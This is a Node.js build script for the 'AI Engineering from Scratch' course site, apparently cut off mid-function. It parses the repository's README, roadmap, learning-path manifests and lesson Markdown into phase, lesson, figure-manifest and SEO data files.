#!/usr/bin/env node
/**
 * Build script for AI Engineering from Scratch website.
 * Parses README.md, ROADMAP.md, and glossary/terms.md from the repo root
 * and generates data.js with all phase/lesson/glossary data.
 *
 * Run: node site/build.js
 * Called automatically by GitHub Actions on every push.
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const REPO_ROOT = path.resolve(__dirname, '..');
const README_PATH = path.join(REPO_ROOT, 'README.md');
const ROADMAP_PATH = path.join(REPO_ROOT, 'ROADMAP.md');
const GLOSSARY_PATH = path.join(REPO_ROOT, 'glossary', 'terms.md');
const OUTPUT_PATH = path.join(__dirname, 'data.js');
const CERTIFICATIONS_PATH = path.join(REPO_ROOT, 'certifications');
const CERTIFICATION_OUTPUT_PATH = path.join(__dirname, 'certification-data.js');
const FIGURE_MANIFEST_OUTPUT_PATH = path.join(__dirname, 'figure-manifest.js');
const LESSON_SEO_OUTPUT_PATH = path.join(__dirname, 'lesson-seo.json');
const CERTIFICATION_SEO_OUTPUT_PATH = path.join(__dirname, 'certification-seo.json');
const SEO_MANIFEST_VERSION = 1;
const CATALOG_DISCOVERY_START = '<!-- GENERATED:LESSON-DISCOVERY:START -->';
const CATALOG_DISCOVERY_END = '<!-- GENERATED:LESSON-DISCOVERY:END -->';
const CERTIFICATION_DISCOVERY_START = '<!-- GENERATED:CERTIFICATION-DISCOVERY:START -->';
const CERTIFICATION_DISCOVERY_END = '<!-- GENERATED:CERTIFICATION-DISCOVERY:END -->';
const SPONSORS_SOURCE_PATH = path.join(REPO_ROOT, 'SPONSORS.md');
const SPONSORS_PAGE_START = '<!-- GENERATED:SPONSORS:START -->';
const SPONSORS_PAGE_END = '<!-- GENERATED:SPONSORS:END -->';
const SPONSOR_TAG_ATTRIBUTES = {
  a: ['href'],
  picture: [],
  source: ['media', 'srcset'],
  img: ['src', 'alt', 'width', 'height'],
};

// Registration order is public behavior. Later providers intentionally replace
// selected legacy figures, including figures-tools3.js -> figures-mcp.js.
const FIGURE_PROVIDER_ORDER = [
  'figures.js',
  'figures-math.js',
  'figures-ml.js',
  'figures-dl.js',
  'figures-vision-speech.js',
  'figures-transformers.js',
  'figures-genai-rl.js',
  'figures-llms-systems.js',
  'figures-agents-alignment.js',
  'figures-math2.js',
  'figures-nlp2.js',
  'figures-llms2.js',
  'figures-infra.js',
  'figures-frontier.js',
  'figures-llmeng.js',
  'figures-multimodal.js',
  'figures-agents2.js',
  'figures-alignment2.js',
  'figures-foundations2.js',
  'figures-capstone-a.js',
  'figures-capstone-b.js',
  'figures-agents3.js',
  'figures-nlp3.js',
  'figures-cv2.js',
  'figures-llms3.js',
  'figures-autonomous2.js',
  'figures-swarms2.js',
  'figures-infra2.js',
  'figures-systems3.js',
  'figures-capstone-c.js',
  'figures-capstone-d.js',
  'figures-cv3.js',
  'figures-speech2.js',
  'figures-multimodal2.js',
  'figures-tools2.js',
  'figures-agents4.js',
  'figures-swarms3.js',
  'figures-genai3.js',
  'figures-misc2.js',
  'figures-history.js',
  'figures-capstone-e.js',
  'figures-capstone-f.js',
  'figures-capstone-g.js',
  'figures-capstone-h.js',
  'figures-capstone-i.js',
  'figures-alignment3.js',
  'figures-alignment4.js',
  'figures-workbench.js',
  'figures-tools3.js',
  'figures-mcp.js',
  'figures-setup.js',
  'figures-foundations3.js',
  'figures-visaudio4.js',
  'figures-nlp5.js',
  'figures-llmstack5.js',
  'figures-autoswarm5.js',
  'figures-infra4.js',
  'figures-claude-certifications.js',
];

const GITHUB_BASE = 'https://github.com/rohitg00/ai-engineering-from-scratch/tree/main/';
const GITHUB_BLOB_BASE = 'https://github.com/rohitg00/ai-engineering-from-scratch/blob/main/';
const SITE_ORIGIN = 'https://aiengineeringfromscratch.com';

// GITHUB_BASE lesson url -> site path "phases/<phase>/<lesson>"
function lessonPath(url) {
  if (!url) return null;
  const m = url.match(/(phases\/[^/]+\/[^/]+)\/?$/);
  return m ? m[1] : null;
}

// ─── Parse ROADMAP.md for lesson statuses ────────────────────────────
function parseRoadmap(content) {
  const statuses = {}; // { "Phase 0": { phaseStatus, lessons: { "Dev Environment": "complete" } } }
  let currentPhase = null;
  let currentPhaseStatus = null;

  for (const line of content.split(/\r?\n/)) {
    // Match phase headers like: ## Phase 0: Setup & Tooling — ✅
    const phaseMatch = line.match(/^##\s+Phase\s+(\d+).*?—\s*(✅|🚧|⬚)/);
    if (phaseMatch) {
      const phaseId = parseInt(phaseMatch[1]);
      const statusEmoji = phaseMatch[2];
      currentPhaseStatus = statusEmoji === '✅' ? 'complete' : statusEmoji === '🚧' ? 'in-progress' : 'planned';
      currentPhase = `Phase ${phaseId}`;
      statuses[currentPhase] = { phaseStatus: currentPhaseStatus, lessons: {} };
      continue;
    }

    // Match lesson rows like: | 01 | Dev Environment | ✅ |
    if (currentPhase) {
      const lessonMatch = line.match(/^\|\s*\d+\s*\|\s*(.+?)\s*\|\s*(✅|🚧|⬚)\s*\|/);
      if (lessonMatch) {
        const lessonName = lessonMatch[1].trim();
        const statusEmoji = lessonMatch[2];
        const status = statusEmoji === '✅' ? 'complete' : statusEmoji === '🚧' ? 'in-progress' : 'planned';
        statuses[currentPhase].lessons[lessonName] = status;
      }
    }
  }

  return statuses;
}

// ─── Parse README.md for phases and lessons ──────────────────────────
function parseReadme(content, roadmapStatuses) {
  const phases = [];

  // Split into phase blocks
  // Phase 0 is in a <table> block, phases 1-19 are in <details> blocks
  // We'll parse line by line to extract phase headers and lesson tables

  const lines = content.split(/\r?\n/);
  let currentPhase = null;
  let inLessonTable = false;
  let isCapstoneTable = false;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];

    // Match Phase header - multiple formats supported:
    // Old: ### Phase 0: Setup & Tooling `12 lessons`
    // Old: <summary><strong>Phase 1: Math Foundations</strong> <code>22 lessons</code> ... <em>Description</em></summary>
    // New: ### ![](https://img.shields.io/badge/Phase_0-Setup_&_Tooling-95A5A6?style=for-the-badge) `12 lessons`
    // New: <summary><b>🟣 Phase 1 — Math Foundations</b> &nbsp;<code>22 lessons</code>&nbsp; <em>Description</em></summary>
    const phaseHeaderMatch =
      line.match(/###\s+Phase\s+(\d+):\s+(.+?)\s*`(\d+)\s+lessons?`/) ||
      line.match(/###\s+!\[\]\([^)]*?Phase[_\s]+(\d+)[-_]([^?)]+?)-[A-F0-9]{6}[^)]*\)\s*`(\d+)\s+lessons?`/i);
    const detailsHeaderMatch =
      line.match(/<summary><strong>Phase\s+(\d+):\s+(.+?)<\/strong>\s*<code>(\d+)\s+(?:lessons?|projects?)<\/code>.*?<em>(.*?)<\/em>/) ||
      line.match(/<summary>\s*<b>\s*(?:[^\w\s]+\s+)?Phase\s+(\d+)\s*[—\-:]\s*(.+?)<\/b>.*?<code>(\d+)\s+(?:lessons?|projects?)<\/code>.*?<em>(.*?)<\/em>/);

    if (phaseHeaderMatch) {
      const [, idStr, rawName] = phaseHeaderMatch;
      const id = parseInt(idStr);
      const name = rawName.replace(/_/g, ' ').trim();
      // Look for the description on the next line (blockquote)
      let desc = '';
      for (let j = i + 1; j < Math.min(i + 5, lines.length); j++) {
        if (lines[j].startsWith('>')) {
          desc = lines[j].replace(/^>\s*/, '').trim();
          break;
        }
      }
      const roadmapKey = `Phase ${id}`;
      const phaseStatus = roadmapStatuses[roadmapKey]?.phaseStatus || 'planned';
      currentPhase = { id, name: name.trim(), status: phaseStatus, desc, lessons: [] };
      phases.push(currentPhase);
      inLessonTable = false;
      continue;
    }

    if (detailsHeaderMatch) {
      const [, idStr, name, , desc] = detailsHeaderMatch;
      const id = parseInt(idStr);
      const roadmapKey = `Phase ${id}`;
      const phaseStatus = roadmapStatuses[roadmapKey]?.phaseStatus || 'planned';
      currentPhase = { id, name: name.trim(), status: phaseStatus, desc: desc?.trim() || '', lessons: [] };
      phases.push(currentPhase);
      inLessonTable = false;
      continue;
    }

    // Detect start of lesson table
    if (currentPhase && line.match(/^\|\s*#\s*\|\s*Lesson/)) {
      inLessonTable = true;
      isCapstoneTable = false;
      continue;
    }

    // Skip table separator
    if (inLessonTable && line.match(/^\|[\s:|-]+\|$/)) {
      continue;
    }

    // Parse lesson rows
    if (inLessonTable && currentPhase && line.startsWith('|')) {
      // | 01 | [Dev Environment](phases/00-setup-and-tooling/01-dev-environment/) | Build | Python, Node, Rust |
      // | 02 | Multi-Layer Networks & Forward Pass | Build | Python |
      const cols = line.split('|').map(c => c.trim()).filter(c => c.length > 0);
      if (cols.length >= 4) {
        const lessonCol = cols[1];
        const typeRaw = cols[2];
        const langRaw = cols[3];

        // Type may be plain ("Build") or a shield image: ![Build](https://...)
        const typeBadgeMatch = typeRaw.match(/!\[([^\]]+)\]/);
        const type = typeBadgeMatch ? typeBadgeMatch[1] : typeRaw;

        // Lang may be plain ("Python, Rust") or emoji flags (🐍 🟦 🦀 🟣 ⚛️)
        const EMOJI_LANG = {
          '🐍': 'Python',
          '🟦': 'TypeScript',
          '🦀': 'Rust',
          '🟣': 'Julia',
          '⚛️': 'React',
          '⚛': 'React',
        };
        let lang = langRaw;
        if (/[\uD800-\uDBFF\u2600-\u27BF\u1F300-\u1FAFF]/.test(langRaw) || /[🐍🟦🦀🟣⚛]/u.test(langRaw)) {
          const tokens = Array.from(langRaw)
            .map(ch => EMOJI_LANG[ch])
            .filter(Boolean);
          if (tokens.length) lang = [...new Set(tokens)].join(', ');
          else if (langRaw.trim() === '—' || langRaw.trim() === '-') lang = '';
        }
        if (lang === '—' || lang === '-') lang = '';

        // Check if lesson has a link (meaning it has content)
        const linkMatch = lessonCol.match(/\[(.+?)\]\((.+?)\)/);
        let lessonName, url;
        if (linkMatch) {
          lessonName = linkMatch[1];
          const relativePath = linkMatch[2];
          url = GITHUB_BASE + relativePath.replace(/^\//, '');
        } else {
          lessonName = lessonCol;
          url = null;
        }

        // Get status from roadmap
        const roadmapKey = `Phase ${currentPhase.id}`;
        const roadmapPhase = roadmapStatuses[roadmapKey];
        let status = 'planned';
        if (roadmapPhase) {
          // Try to find matching lesson by fuzzy match
          const lessonNameClean = lessonName.replace(/[-–—:]/g, ' ').replace(/\s+/g, ' ').trim().toLowerCase();
          for (const [rName, rStatus] of Object.entries(roadmapPhase.lessons)) {
            const rNameClean = rName.replace(/[-–—:]/g, ' ').replace(/\s+/g, ' ').trim().toLowerCase();
            if (rNameClean.includes(lessonNameClean) || lessonNameClean.includes(rNameClean) ||
                rNameClean.split(' ').slice(0, 3).join(' ') === lessonNameClean.split(' ').slice(0, 3).join(' ')) {
              status = rStatus;
              break;
            }
          }
        }

        // If it has a link, it's at least complete (override roadmap if needed)
        if (url && status === 'planned') {
          status = 'complete';
        }

        // Capstone tables use the middle column for prerequisite phase tokens
        // (e.g., "P11 P13 P14"), not a Build/Learn enum. Keep `type` on the
        // Build/Learn axis so CSS selectors (data-type="Build"/"Learn") stay
        // valid, and emit the prereq string in a dedicated `combines` field.
        const lessonEntry = {
          name: lessonName.trim(),
          status,
          type: isCapstoneTable ? 'Capstone' : type.trim(),
          lang: lang.trim() || '—',
          ...(isCapstoneTable && { combines: type.trim() }),
          ...(url && { url }),
        };
        currentPhase.lessons.push(lessonEntry);
      }
    }

    // End of table
    if (inLessonTable && (line.match(/<\/td>/) || line.match(/<\/details>/) || (line.trim() === '' && i + 1 < lines.length && !lines[i + 1].startsWith('|')))) {
      inLessonTable = false;
    }

    // Also detect capstone table format (# | Project | Combines | Lang)
    if (currentPhase && line.match(/^\|\s*#\s*\|\s*Project/)) {
      inLessonTable = true;
      isCapstoneTable = true;
      continue;
    }
  }

  return phases;
}

// ─── Parse focused learning paths ────────────────────────────────────
// A learning path is an ordered overlay on the canonical PHASES data. The
// manifest owns intent and pacing; README owns the lesson title and URL.
function parseLearningPaths(repoRoot = REPO_ROOT, phases = []) {
  const learningPathsDir = path.join(repoRoot, 'learning-paths');
  if (!fs.existsSync(learningPathsDir)) return [];

  const lessonsByPath = new Map();
  for (const phase of phases) {
    for (const lesson of phase.lessons || []) {
      const canonicalPath = lessonPath(lesson.url);
      if (!canonicalPath) continue;
      lessonsByPath.set(canonicalPath, {
        title: lesson.name,
        phaseId: phase.id,
        phaseName: phase.name,
        type: lesson.type,
        lang: lesson.lang,
      });
    }
  }

  const manifests = fs.readdirSync(learningPathsDir)
    .filter(file => file.endsWith('.json'))
    .sort();
  const ids = new Set();

  return manifests.map(file => {
    const manifestPath = path.join(learningPathsDir, file);
    const manifest = readJson(manifestPath, `learning path ${file}`);
    const id = String(manifest.id || path.basename(file, '.json')).trim();
    if (!id) throw new Error(`Learning path ${file} needs an id`);
    if (ids.has(id)) throw new Error(`Duplicate learning path id: ${id}`);
    ids.add(id);

    const prerequisiteIds = new Set();
    const prerequisites = (Array.isArray(manifest.prerequisites) ? manifest.prerequisites : [])
      .map((entry, index) => {
        if (!entry || typeof entry !== 'object' || Array.isArray(entry)) {
          throw new Error(`Learning path ${id} prerequisite ${index + 1} must be an object`);
        }
        const normalized = { ...entry };
        if (!Object.prototype.hasOwnProperty.call(normalized, 'id')) return normalized;
        const checkId = String(normalized.id || '').trim();
        if (!checkId) {
          throw new Error(`Learning path ${id} prerequisite ${index + 1} has an empty id`);
        }
        if (prerequisiteIds.has(checkId)) {
          throw new Error(`Learning path ${id} repeats prerequisite id: ${checkId}`);
        }
        prerequisiteIds.add(checkId);
        normalized.id = checkId;
        return normalized;
      });

    function normalizePrerequisiteChecks(value, lessonPath) {
      if (value === undefined) return [];
      if (!Array.isArray(value)) {
        throw new Error(`Learning path ${id} lesson ${lessonPath} prerequisiteChecks must be an array`);
      }
      const seen = new Set();
      return value.map(rawId => {
        if (typeof rawId !== 'string' || !rawId.trim()) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} has an invalid prerequisite check id`);
        }
        const checkId = rawId.trim();
        if (seen.has(checkId)) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} repeats prerequisite check: ${checkId}`);
        }
        if (!prerequisiteIds.has(checkId)) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} references an unknown prerequisite check: ${checkId}`);
        }
        seen.add(checkId);
        return checkId;
      });
    }

    function normalizePrerequisitePaths(value, lessonPath) {
      if (value === undefined) return [];
      if (!Array.isArray(value)) {
        throw new Error(`Learning path ${id} lesson ${lessonPath} prerequisitePaths must be an array`);
      }
      const seen = new Set();
      return value.map(rawPath => {
        if (typeof rawPath !== 'string') {
          throw new Error(`Learning path ${id} lesson ${lessonPath} has an invalid prerequisite path`);
        }
        const prerequisitePath = rawPath.replace(/^\/+|\/+$/g, '');
        if (!prerequisitePath) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} has an invalid prerequisite path`);
        }
        if (seen.has(prerequisitePath)) {
          throw new Error(`Learning path ${id} lesson ${lessonPath} repeats prerequisite path: ${prerequisitePath}`);
        }
        seen.add(prerequisitePath);
        return prerequisitePath;
      });
    }

    function normalizeEntry(entry, index, required) {
      const source = typeof entry === 'string' ? { path: entry } : { ...(entry || {}) };
      const canonicalPath = String(source.path || '').replace(/^\/+|\/+$/g, '');
      if (!canonicalPath) {
        throw new Error(`Learning path ${id} has a lesson without a path`);
      }
      const lesson = lessonsByPath.get(canonicalPath);
      if (!lesson) {
        throw new Error(`Learning path ${id} references an unknown lesson: ${canonicalPath}`);
      }
      return {
        ...source,
        order: Number.isFinite(Number(source.order)) ? Number(source.order) : index + 1,
        path: canonicalPath,
        title: lesson.title,
        phaseId: lesson.phaseId,
        phaseName: lesson.phaseName,
        type: lesson.type,
        lang: lesson.lang,
        required: required ? source.required !== false : false,
        prerequisiteChecks: normalizePrerequisiteChecks(source.prerequisiteChecks, canonicalPath),
        ...(source.prerequisitePaths !== undefined && {
          prerequisitePaths: normalizePrerequisitePaths(source.prerequisitePaths, canonicalPath),
        }),
      };
    }

    const requiredEntries = Array.isArray(manifest.lessons) ? manifest.lessons : [];
    const optionalEntries = Array.isArray(manifest.optionalLessons) ? manifest.optionalLessons : [];
    if (!requiredEntries.length) throw new Error(`Learning path ${id} needs at least one lesson`);

    const byOrder = (a, b) => a.order - b.order;
    const lessons = requiredEntries
      .map((entry, index) => normalizeEntry(entry, index, true))
      .sort(byOrder);
    const optionalLessons = optionalEntries
      .map((entry, index) => normalizeEntry(entry, index, false))
      .sort(byOrder);
    const seenPaths = new Set();
    for (const entry of lessons.concat(optionalLessons)) {
      if (seenPaths.has(entry.path)) {
        throw new Error(`Learning path ${id} repeats lesson: ${entry.path}`);
      }
      seenPaths.add(entry.path);
    }

    const routeEntries = lessons.concat(optionalLessons);
    const routeIndex = new Map(routeEntries.map((entry, index) => [entry.path, index]));
    const prerequisiteGraph = new Map();
    for (const entry of routeEntries) {
      const prerequisitePaths = Array.isArray(entry.prerequisitePaths)
        ? entry.prerequisitePaths
        : [];
      for (const prerequisitePath of prerequisitePaths) {
        if (!lessonsByPath.has(prerequisitePath)) {
          throw new Error(
            `Learning path ${id} lesson ${entry.path} references an unknown prerequisite path: ${prerequisitePath}`
          );
        }
        if (prerequisitePath === entry.path) {
          throw new Error(`Learning path ${id} lesson ${entry.path} cannot depend on itself`);
        }
      }
      prerequisiteGraph.set(
        entry.path,
        prerequisitePaths.filter(prerequisitePath => routeIndex.has(prerequisitePath))
      );
    }

    const visiting = [];
    const visitingSet = new Set();
    const visited = new Set();
    function visitPrerequisites(lessonPath) {
      if (visitingSet.has(lessonPath)) {
        const cycleStart = visiting.indexOf(lessonPath);
        const cycle = visiting.slice(cycleStart).concat(lessonPath);
        throw new Error(`Learning path ${id} contains a prerequisite cycle: ${cycle.join(' -> ')}`);
      }
      if (visited.has(lessonPath)) return;
      visiting.push(lessonPath);
      visitingSet.add(lessonPath);
      for (const prerequisitePath of prerequisiteGraph.get(lessonPath) || []) {
        visitPrerequisites(prerequisitePath);
      }
      visiting.pop();
      visitingSet.delete(lessonPath);
      visited.add(lessonPath);
    }
    for (const entry of routeEntries) visitPrerequisites(entry.path);

    for (const entry of routeEntries) {
      for (const prerequisitePath of prerequisiteGraph.get(entry.path) || []) {
        if (routeIndex.get(prerequisitePath) >= routeIndex.get(entry.path)) {
          throw new Error(
            `Learning path ${id} lesson ${entry.path} has a forward prerequisite: ${prerequisitePath}`
          );
        }
      }
    }

    return {
      ...manifest,
      id,
      title: String(manifest.title || id).trim(),
      summary: String(manifest.summary || '').trim(),
      estimatedMinutes: Number(manifest.estimatedMinutes || 0),
      prerequisites,
      lessons,
      optionalLessons,
    };
  });
}

// ─── Resolve figure IDs to the provider scripts that register them ─────────
// Lessons are fetched at runtime and translated lessons can retain figure
// fences, so the browser resolves providers from the rendered data-figure IDs.
// The build emits only IDs that are actually used by lesson Markdown.
function collectMarkdownFiles(directory, files = []) {
  if (!fs.existsSync(directory)) return files;
  const entries = fs.readdirSync(directory, { withFileTypes: true })
    .sort((a, b) => a.name.localeCompare(b.name));
  for (const entry of entries) {
    const fullPath = path.join(directory, entry.name);
    if (entry.isDirectory()) collectMarkdownFiles(fullPath, files);
    else if (entry.isFile() && entry.name.endsWith('.md')) files.push(fullPath);
  }
  return files;
}

function discoverUsedFigureIds(repoRoot = REPO_ROOT) {
  const ids = new Set();
  const roots = [path.join(repoRoot, 'phases'), path.join(repoRoot, 'certifications')];
  for (const root of roots) {
    for (const file of collectMarkdownFiles(root, [])) {
      const markdown = fs.readFileSync(file, 'utf8');
      for (const match of markdown.matchAll(/```figure\s*\r?\n([\s\S]*?)```/g)) {
        const id = match[1].trim().split(/\s+/)[0];
        if (id) ids.add(id);
      }
    }
  }
  return [...ids].sort();
}

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function assetVersion(content) {
  return crypto.createHash('sha256').update(content).digest('hex').slice(0, 12);
}

function discoverFigureProviderOrder(siteDir = __dirname, baseOrder = FIGURE_PROVIDER_ORDER) {
  const known = new Set(baseOrder);
  const additions = fs.readdirSync(siteDir)
    .filter(file => /^figures(?:-[a-z0-9-]+)?\.js$/i.test(file) && !known.has(file))
    .sort((a, b) => a.localeCompare(b));
  return baseOrder.concat(additions);
}

function buildFigureProviderManifest(
  repoRoot = REPO_ROOT,
  siteDir = __dirname,
  providerOrder
) {
  const resolvedProviderOrder = Array.isArray(providerOrder)
    ? providerOrder.slice()
    : discoverFigureProviderOrder(siteDir);
  const providerSources = new Map();
  const providerVersions = {};
  for (const provider of resolvedProviderOrder) {
    const providerPath = path.join(siteDir, provider);
    if (!fs.existsSync(providerPath)) throw new Error(`Missing figure provider: ${provider}`);
    const source = fs.readFileSync(providerPath, 'utf8');
    providerSources.set(provider, source);
    providerVersions[provider] = assetVersion(source);
  }
  const localSource = fs.readFileSync(path.join(siteDir, 'lesson-figures.js'), 'utf8');
  const providersByFigure = {};
  const unresolved = [];
  for (const id of discoverUsedFigureIds(repoRoot)) {
    const quotedId = new RegExp(`['"]${escapeRegExp(id)}['"]`);
    const providers = resolvedProviderOrder.filter(provider => quotedId.test(providerSources.get(provider)));
    if (providers.length) providersByFigure[id] = providers;
    else if (!quotedId.test(localSource)) unresolved.push(id);
  }
  if (unresolved.length) {
    throw new Error(`Figure IDs have no provider: ${unresolved.join(', ')}`);
  }
  return { providerOrder: resolvedProviderOrder, providerVersions, providersByFigure };
}

function syncFigureAssetVersions(siteDir, manifestSource) {
  const lessonPath = path.join(siteDir, 'lesson.html');
  const runtimePath = path.join(siteDir, 'lesson-figures.js');
  if (!fs.existsSync(lessonPath) || !fs.existsSync(runtimePath)) return;

  const versions = {
    'lesson-figures.js': assetVersion(fs.readFileSync(runtimePath, 'utf8')),
    'figure-manifest.js': assetVersion(manifestSource),
  };
  let html = fs.readFileSync(lessonPath, 'utf8');
  for (const [file, version] of Object.entries(versions)) {
    const reference = new RegExp(`(<script src="${escapeRegExp(file)})(?:\\?v=[^"]*)?("></script>)`);
    if (!reference.test(html)) throw new Error(`lesson.html is missing the ${file} script reference`);
    html = html.replace(reference, `$1?v=${version}$2`);
  }
  fs.writeFileSync(lessonPath, html, 'utf8');
}

function serializeFigureProviderManifest(manifest) {
  return '// Auto-generated by build.js from lesson figure fences and provider registrations.\n' +
    '// Provider order is significant: later registrations override earlier ones.\n' +
    `window.AIFS_FIGURE_PROVIDER_ORDER = ${JSON.stringify(manifest.providerOrder, null, 2)};\n` +
    `window.AIFS_FIGURE_PROVIDER_VERSIONS = ${JSON.stringify(manifest.providerVersions, null, 2)};\n` +
    `window.AIFS_FIGURE_PROVIDERS = ${JSON.stringify(manifest.providersByFigure, null, 2)};\n`;
}

function writeFigureManifest(repoRoot = REPO_ROOT, siteDir = __dirname) {
  const manifest = buildFigureProviderManifest(repoRoot, siteDir);
  const output = serializeFigureProviderManifest(manifest);
  const outputPath = siteDir === __dirname
    ? FIGURE_MANIFEST_OUTPUT_PATH
    : path.join(siteDir, 'figure-manifest.js');
  fs.writeFileSync(outputPath, output, 'utf8');
  syncFigureAssetVersions(siteDir, output);
  console.log(`   wrote figure-manifest.js (${Object.keys(manifest.providersByFigure).length} routed figures)`);
  return manifest;
}

// ─── Parse the canonical phase dependency graph from README.md ───────
// The public Mermaid diagram under "The shape of the curriculum" owns the
// phase-level learning path. Keeping the website graph generated from it
// prevents the interactive roadmap from drifting into a second curriculum.
function parseCurriculumPrereqs(content, phases) {
  const section = content.match(/## The shape of the curriculum[\s\S]*?```mermaid\s*\r?\n([\s\S]*?)```/);
  if (!section) throw new Error('README.md is missing the canonical curriculum Mermaid graph');

  const phaseIds = phases.map(phase => phase.id).sort((a, b) => a - b);
  const validIds = new Set(phaseIds);
  const prerequisites = {};
  const children = {};
  const seenEdges = new Set();
  for (const id of phaseIds) {
    prerequisites[id] = [];
    children[id] = [];
  }

  for (const line of section[1].split(/\r?\n/)) {
    const match = line.match(/^\s*P(\d+)(?:\[[^\]]*\])?\s*-->\s*P(\d+)/);
    if (!match) continue;
    const from = Number(match[1]);
    const to = Number(match[2]);
    if (!validIds.has(from) || !validIds.has(to)) {
      throw new Error(`Curriculum edge P${from} -> P${to} references an unknown phase`);
    }
    if (from === to) throw new Error(`Curriculum phase P${from} cannot depend on itself`);
    const key = `${from}-${to}`;
    if (seenEdges.has(key)) throw new Error(`Duplicate curriculum edge P${from} -> P${to}`);
    seenEdges.add(key);
    prerequisites[to].push(from);
    children[from].push(to);
  }

  if (!seenEdges.size) throw new Error('The canonical curriculum Mermaid graph contains no edges');

  const roots = phaseIds.filter(id => prerequisites[id].length === 0);
  if (roots.length !== 1 || roots[0] !== 0) {
    throw new Error(`Curriculum graph must have Phase 0 as its only root; found ${roots.join(', ') || 'none'}`);
  }

  const reached = new Set([0]);
  const queue = [0];
  while (queue.length) {
    const id = queue.shift();
    for (const child of children[id]) {
      if (reached.has(child)) continue;
      reached.add(child);
      queue.push(child);
    }
  }
  const unreachable = phaseIds.filter(id => !reached.has(id));
  if (unreachable.length) {
    throw new Error(`Curriculum graph has unreachable phases: ${unreachable.join(', ')}`);
  }

  const visiting = new Set();
  const visited = new Set();
  function visit(id) {
    if (visiting.has(id)) throw new Error(`Curriculum graph contains a cycle through Phase ${id}`);
    if (visited.has(id)) return;
    visiting.add(id);
    for (const child of children[id]) visit(child);
    visiting.delete(id);
    visited.add(id);
  }
  visit(0);

  return prerequisites;
}

// ─── Extract lesson summary + keywords from docs/en.md ───────────────
/**
 * Single-pass read of a lesson's docs/en.md.
 *
 * Returns:
 *   summary  — first `> blockquote` line (the lesson's one-liner motto).
 *   keywords — all `### H3` heading texts joined by ' · '.
 *              H3 headings are the densest vocabulary in a lesson doc
 *              (e.g. "Scaled dot-product · Causal masking · KV cache"),
 *              so they extend search coverage without bloating data.js.
 *
 * Both fields are empty strings when the file is absent or has no
 * matching content — expected for planned lessons with no docs yet.
 */
function extractLessonMeta(relPath) {
  const docPath = path.join(REPO_ROOT, relPath, 'docs', 'en.md');
  const result = { summary: '', keywords: '' };
  try {
    const lines = fs.readFileSync(docPath, 'utf8').split(/\r?\n/);
    const h3s = [];
    for (const raw of lines) {
      const line = raw.trim();
      if (!result.summary && line.startsWith('> ') && line.length > 3) {
        const s = line.slice(2).trim();
        result.summary = s.length > 180 ? s.slice(0, 177) + '…' : s;
      }
      if (line.startsWith('### ')) {
        const heading = line.slice(4).trim();
        if (heading) h3s.push(heading);
      }
    }
    if (h3s.length) result.keywords = h3s.join(' · ');
  } catch (_) {
    // File absent or unreadable — expected for planned lessons.
  }
  return result;
}

function normalizeWhitespace(value) {
  return String(value || '').replace(/\s+/g, ' ').trim();
}

function plainMarkdown(value) {
  return normalizeWhitespace(value)
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/\[([^\]]+)\]\([^)]*\)/g, '$1')
    .replace(/<[^>]+>/g, ' ')
    .replace(/`([^`]+)`/g, '$1')
    .replace(/[*_~]+/g, '')
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/&quot;/gi, '"')
    .replace(/&#39;/gi, "'")
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>')
    .replace(/\\([\\`*_[\]{}()#+\-.!])/g, '$1');
}

function truncateText(value, limit) {
  const text = normalizeWhitespace(value);
  if (!limit || text.length <= limit) return text;
  const clipped = text.slice(0, Math.max(0, limit - 1));
  const boundary = clipped.lastIndexOf(' ');
  return (boundary >= Math.floor(limit * 0.65) ? clipped.slice(0, boundary) : clipped).trimEnd() + '…';
}

function wordCount(value) {
  const text = normalizeWhitespace(value);
  return text ? text.split(' ').length : 0;
}

function truncateWords(value, limit) {
  const words = normalizeWhitespace(value).split(' ').filter(Boolean);
  if (!limit || words.length <= limit) return words.join(' ');
  return words.slice(0, limit).join(' ') + '…';
}

function seoTitleFor(title) {
  const brandedTitle = `${title} | AI Engineering from Scratch`;
  return brandedTitle.length <= 60 ? brandedTitle : truncateText(title, 60);
}

function descriptionFromParts(title, parts) {
  const uniqueParts = [];
  for (const value of parts) {
    const text = normalizeWhitespace(value);
    if (text && !uniqueParts.includes(text)) uniqueParts.push(text);
  }
  let body = '';
  for (const part of uniqueParts) {
    body = normalizeWhitespace(`${body} ${part}`);
    const candidate = body.toLowerCase().startsWith(title.toLowerCase()) ? body : `${title}: ${body}`;
    if (candidate.length >= 125) break;
  }
  const source = body
    ? (body.toLowerCase().startsWith(title.toLowerCase()) ? body : `${title}: ${body}`)
    : title;
  return { description: truncateText(source, 160), descriptionSourceLength: source.length };
}

function lessonDocumentSeo(markdown, fallbackTitle) {
  const lines = String(markdown || '').split(/\r?\n/);
  let title = normalizeWhitespace(fallbackTitle);
  let summary = '';
  let inFence = false;
  let paragraph = [];
  const paragraphs = [];

  function flushParagraph() {
    const text = plainMarkdown(paragraph.join(' '));
    if (text) paragraphs.push(text);
    paragraph = [];
  }

  for (const raw of lines) {
    const line = raw.trim();
    if (/^```/.test(line)) {
      flushParagraph();
      inFence = !inFence;
      continue;
    }
    if (inFence) continue;
    if (!line) {
      flushParagraph();
      continue;
    }
    if (line.startsWith('# ')) {
      title = plainMarkdown(line.slice(2)) || title;
      flushParagraph();
      continue;
    }
    if (line.startsWith('>')) {
      if (!summary) summary = plainMarkdown(line.replace(/^>\s*/, ''));
      flushParagraph();
      continue;
    }
    const listItem = line.match(/^(?:[-*+]\s|\d+[.)]\s)(.+)$/);
    if (listItem) {
      const item = plainMarkdown(listItem[1]).replace(/^\[[ xX]\]\s*/, '');
      if (item) paragraph.push(/[.!?]$/.test(item) ? item : item + '.');
      continue;
    }
    if (/^#{2,6}\s/.test(line) ||
        /^\*\*(Type|Languages|Prerequisites|Time):\*\*/i.test(line) ||
        /^\|/.test(line) ||
        /^(?:---+|===+)$/.test(line)) {
      flushParagraph();
      continue;
    }
    paragraph.push(line);
  }
  flushParagraph();

  const proseParts = [summary].concat(paragraphs).filter(Boolean);
